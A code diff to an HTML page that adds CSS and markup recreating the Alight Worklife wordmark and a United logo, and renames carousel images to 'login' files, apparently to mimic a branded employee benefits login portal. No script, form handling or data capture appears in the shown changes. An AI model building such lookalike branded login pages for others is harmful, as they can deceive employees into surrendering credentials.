@@ -161,20 +161,69 @@
         .under{
             font-size: small;
         }
+
+                .logo-container { 
+            text-align: center; 
+            margin: 40px 0 30px; 
+            z-index: 2; 
+            position: relative;
+        }
+
+        /* Alight Worklife Logo */
+        .alight-worklife {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 10px;
+        }
+        .alight-worklife .alight {
+            color: #1a1a1a;
+        }
+        .alight-worklife .worklife {
+            background: linear-gradient(90deg, #7ed957, #34d399);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+
+        /* United Logo */
+        .united-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 15px 0 20px;
+        }
+        .united-logo .united-text {
+            font-size: 2.4rem;
+            font-weight: 800;
+            color: #0033a0;
+            letter-spacing: 0.05em;
+        }
+        .globe {
+            font-size: 2.6rem;
+            line-height: 1;
+        }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="logo"></div>
-        <div class="subtitle"></div>
-        <div class="sun"></div>
-    </div>
+  <div class="logo-container">
+        <div class="alight-worklife">
+            <span class="alight">alight</span>
+            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
+        </div>
+
+        <div class="united-logo">
+            <span class="united-text">UNITED</span>
+            <span class="globe">🌐</span>
+        </div>
+
 
     <!-- Carousel -->
     <div class="carousel">
         <div class="slides" id="slides">
             <!-- Slide 1 -->
-            <div class="slide" style="background-image: url('alight1.jpg');">
+            <div class="slide" style="background-image: url('login1.jpg');">
                 <div class="slide-content">
                     <h2>Innovative</h2>
                     <p>Manage all aspects of health and wealth using our AI-powered app.</p>
@@ -182,7 +231,7 @@
             </div>
             
             <!-- Slide 2 -->
-            <div class="slide" style="background-image: url('alight2.jpg');">
+            <div class="slide" style="background-image: url('login2.jpg');">
                 <div class="slide-content">
                     <h2>Personal</h2>
                     <p>Get personalized recommendations about spending and savings to maximize your account’s value.</p>
@@ -190,7 +239,7 @@
             </div>
             
             <!-- Slide 3 -->
-            <div class="slide" style="background-image: url('alight3.jpg');">
+            <div class="slide" style="background-image: url('login3.jpg');">
                 <div class="slide-content">
                     <h2>Simple</h2>
                     <p>Account self-service made easy!</p>
